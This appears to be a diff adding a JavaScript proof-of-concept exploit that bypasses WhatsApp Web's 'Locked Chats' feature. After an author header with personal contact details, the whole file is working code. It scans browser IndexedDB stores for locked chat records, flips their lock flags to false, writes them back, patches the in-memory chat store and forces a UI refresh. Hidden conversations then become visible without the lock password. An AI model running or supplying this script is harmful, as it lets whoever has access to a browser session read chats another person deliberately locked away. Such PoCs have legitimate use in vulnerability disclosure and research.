@@ -1,0 +1,224 @@
+/*
+  PoC Title : WhatsApp Web — Local "Locked Chats" UI bypass (IndexedDB/localStorage)
+  Author    : Sds Dilqem Memmedov
+  Date      : 2025-10-23
+  App       : WhatsApp Web (web.whatsapp.com) — tested against Version 2.3000.1028896525 (public web-app)
+  Purpose   : Proof-of-Concept script to locate client-side "locked" chat records in browser storage
+              (IndexedDB / localStorage), toggle lock flags to false and attempt in-memory UI refresh
+              so that locked chats become visible/usable without entering the lock password.
+  Severity  : High (exposes hidden messages and metadata locally)
+  Scope     : web.whatsapp.com
+
+  Contact   : sdsdilqem@gmail.com     |    +994554709390 (For Whatsapp Contact)
+*/
+
+
+(async () => {
+  // =================== CONFIG ===================
+  const dryRun = false; // If set to true, no changes will be made — the script will only report what it finds.
+  const EXPORT_BACKUP = true; // download backup files before any changes
+  const TARGET_DB_CANDIDATES = ["wawc","whatsapp","whatsapp_web","wa_db","model-storage","localforage"];
+  const PRIORITY_STORE_REGEX = /chat|conversation|convo|thread|store|contact|model-storage/i;
+  
+  // ==============================================
+
+  const log = (...args) => console.log("[UNLOCK ALL]", ...args);
+  const warn = (...args) => console.warn("[UNLOCK ALL]", ...args);
+
+  const listDBs = async () => {
+    if (indexedDB && typeof indexedDB.databases === "function") {
+      try {
+        const dbs = await indexedDB.databases();
+        return dbs.map(d => d.name).filter(Boolean);
+      } catch (e) {
+        // ignore
+      }
+    }
+    return TARGET_DB_CANDIDATES;
+  };
+
+  const downloadJSON = (obj, filename) => {
+    try {
+      const blob = new Blob([JSON.stringify(obj, null, 2)], {type: "application/json"});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(()=>URL.revokeObjectURL(url), 2000);
+    } catch (e) {
+      warn("download failed:", e);
+    }
+  };
+
+  const decodeId = rec => rec?.id ?? rec?.jid ?? rec?.chatId ?? rec?.userId ?? null;
+
+  // Try to update in-memory Store (if available)
+  const attemptInMemoryUpdate = (id) => {
+    try {
+      // common patterns used by community scripts
+      if (window.Store) {
+        // Chat collection might be in window.Store.Chat or window.Store.Chat.models
+        const Chat = window.Store.Chat;
+        if (Chat) {
+          // Chat.get / Chat.get is common
+          let chatObj = null;
+          try {
+            if (typeof Chat.get === "function") chatObj = Chat.get(id);
+            else if (Chat.models && Chat.models[id]) chatObj = Chat.models[id];
+            else if (Chat.get && Chat.get(id)) chatObj = Chat.get(id);
+          } catch (e) { /* ignore */ }
+
+          if (chatObj) {
+            try { chatObj.isLocked = false; } catch(e){}
+            try { chatObj.pin = 0; } catch(e){}
+            try { chatObj.archive = false; } catch(e){}
+            try { chatObj.hasOpened = true; } catch(e){}
+            // notify store that chat changed (some versions have .emit or .update)
+            try { if (typeof chatObj.save === "function") chatObj.save(); } catch(e){}
+            try { if (typeof Chat.update === "function") Chat.update(chatObj); } catch(e){}
+            try { if (window.Store && window.Store.Chat && window.Store.Chat.store && typeof window.Store.Chat.store.emit === "function") window.Store.Chat.store.emit('change', chatObj); } catch(e){}
+            return true;
+          }
+        }
+        // Another common registry: window.Store.Chat._models or window.Store.Chat.modelsMap
+        // Try scanning known maps
+        const maps = ["models","_models","collection","_collection","map"];
+        for (const m of maps) {
+          try {
+            const col = window.Store.Chat && window.Store.Chat[m];
+            if (col && typeof col === "object") {
+              // try id keys or search
+              if (col[id]) {
+                try { col[id].isLocked = false; col[id].pin = 0; col[id].archive = false; col[id].hasOpened = true; } catch(e){}
+                return true;
+              }
+              // fallback: search values
+              for (const k of Object.keys(col)) {
+                const v = col[k];
+                if (v && (v.id === id || v.jid === id || v.name === id)) {
+                  try { v.isLocked = false; v.pin = 0; v.archive = false; v.hasOpened = true; } catch(e){}
+                  return true;
+                }
+              }
+            }
+          } catch(e){}
+        }
+      }
+    } catch (e) {
+      // swallow
+    }
+    return false;
+  };
+
+  // Core: scan DBs and update records
+  const dbNames = await listDBs();
+  log("DB candidates:", dbNames);
+  let totalFound = 0, totalUpdated = 0;
+  const changedRecords = [];
+
+  for (const dbName of dbNames) {
+    if (!dbName) continue;
+    try {
+      const openReq = indexedDB.open(dbName);
+      const db = await new Promise((res, rej) => {
+        openReq.onsuccess = e => res(e.target.result);
+        openReq.onerror = e => rej(e.target.error || new Error("open fail"));
+        openReq.onblocked = () => warn("open blocked:", dbName);
+      });
+
+      const stores = Array.from(db.objectStoreNames || []);
+      const toScan = stores.filter(s => PRIORITY_STORE_REGEX.test(s)).length ? stores.filter(s => PRIORITY_STORE_REGEX.test(s)) : stores;
+
+      for (const storeName of toScan) {
+        try {
+          const tx = db.transaction(storeName, "readwrite");
+          const store = tx.objectStore(storeName);
+
+          // Prefer getAll for ease
+          const all = await new Promise((res, rej) => {
+            const r = store.getAll();
+            r.onsuccess = () => res(r.result || []);
+            r.onerror = () => rej(r.error || new Error("getAll failed"));
+          });
+
+          for (const rec of all) {
+            if (!rec || typeof rec !== "object") continue;
+            const isLocked = (rec.isLocked === true) || (rec.locked === true);
+            if (!isLocked) continue;
+
+            totalFound++;
+            const id = decodeId(rec) || `(no-id-${totalFound})`;
+            log("Found locked:", dbName, storeName, id);
+
+            // backup before
+            if (EXPORT_BACKUP) downloadJSON(rec, `unlock_backup_before_${id}.json`);
+
+            // modify fields
+            if (!dryRun) {
+              try { rec.isLocked = false; } catch(e){}
+              try { rec.locked = false; } catch(e){}
+              try { rec.pin = 0; } catch(e){}
+              try { rec.archive = false; } catch(e){}
+              try { rec.hasOpened = true; } catch(e){}
+              // persist back
+              try {
+                await new Promise((res, rej) => {
+                  const putReq = store.put(rec);
+                  putReq.onsuccess = () => res(putReq.result);
+                  putReq.onerror = () => rej(putReq.error || new Error("put failed"));
+                });
+                totalUpdated++;
+                // backup after
+                if (EXPORT_BACKUP) downloadJSON(rec, `unlock_backup_after_${id}.json`);
+                changedRecords.push({db: dbName, store: storeName, id});
+              } catch (e) {
+                warn("Failed to put rec:", dbName, storeName, id, e);
+              }
+            } else {
+              // dry run: only record
+              changedRecords.push({db: dbName, store: storeName, id});
+            }
+
+            // try update in-memory model as best-effort
+            const memOk = attemptInMemoryUpdate(id);
+            if (memOk) log("In-memory update attempted for", id);
+          }
+        } catch (e) {
+          warn("Store error:", dbName, storeName, e);
+        }
+      }
+
+      try { db.close(); } catch(e){}
+    } catch (e) {
+      // cannot open DB - skip
+      //warn("DB open error:", dbName, e);
+    }
+  }
+
+  // show summary
+  log(`Finished. Found: ${totalFound}. Updated: ${totalUpdated}. dryRun=${dryRun}`);
+  if (changedRecords.length) console.table(changedRecords);
+
+  // If in-memory updates might not reflect UI, suggest reload or try to force UI update
+  // Try to force UI refresh by dispatching a StorageEvent and/or calling Store events if possible
+  try {
+    // dispatch fake storage event
+    window.dispatchEvent(new StorageEvent('storage', {key: 'whatsapp-unlock', newValue: Date.now().toString()}));
+  } catch(e){}
+
+  // attempt to call any refresh handlers on Store
+  try {
+    if (window.Store && window.Store.Chat && typeof window.Store.Chat.update === "function") {
+      try { window.Store.Chat.update(); } catch(e){}
+    }
+    if (window.Store && typeof window.Store.emit === "function") {
+      try { window.Store.emit("change"); } catch(e){}
+    }
+  } catch(e){}
+
+  log("If UI didn't update, RELOAD THE PAGE (F5). Reload is recommended to reflect changes.");
+
+})();
